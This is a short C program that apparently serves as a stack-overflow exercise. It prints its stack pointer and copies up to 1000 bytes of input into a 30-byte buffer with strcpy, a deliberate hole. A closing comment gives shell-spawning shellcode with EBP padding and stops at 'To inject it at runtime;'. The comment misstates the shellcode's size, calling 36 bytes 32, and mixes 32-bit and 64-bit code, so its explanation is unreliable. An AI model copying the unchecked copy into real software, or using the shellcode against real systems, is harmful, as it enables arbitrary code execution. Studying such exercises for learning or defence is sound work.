#include <stdio.h>
#include <string.h>
unsigned long print_esp(void)
{
	__asm__("movl %esp, %eax");
}

int main(void)
{
	printf("Stack Address: 0x%x\n", print_esp());

	char short_array[30];
	char long_array[1000];

	fgets(long_array, 1000, stdin);
	strcpy(short_array, long_array);
	printf("%s\n", short_array);

	return 0;
}

/*
Bytecode can be 32 bits because the array is 30 long
It will be stored in memory as 8 words, or 32 bytes

32 Bytes of shellcode
\x48\x31\xc0\x50\x68\x2f\x62\x69\x6e\xc7\x44\x24\x04\x2f
\x62\x61\x73\xc6\x44\x24\x08\x68\x48\x89\xe7\x50\x48\x89
\xe6\x48\x89\xc2\xb0\x3b\x0f\x05

4 Bytes of padding for EBP
\x41\x41\x41\x41

4 Byte address will be printed at runtime

This is the shellcode
\x48\x31\xc0\x50\x68\x2f\x62\x69\x6e\xc7\x44\x24\x04\x2f\x62\x61\x73\xc6\x44\x24\x08\x68\x48\x89\xe7\x50\x48\x89\xe6\x48\x89\xc2\xb0\x3b\x0f\x05\x41\x41\x41\x41

To inject it at runtime;

*/
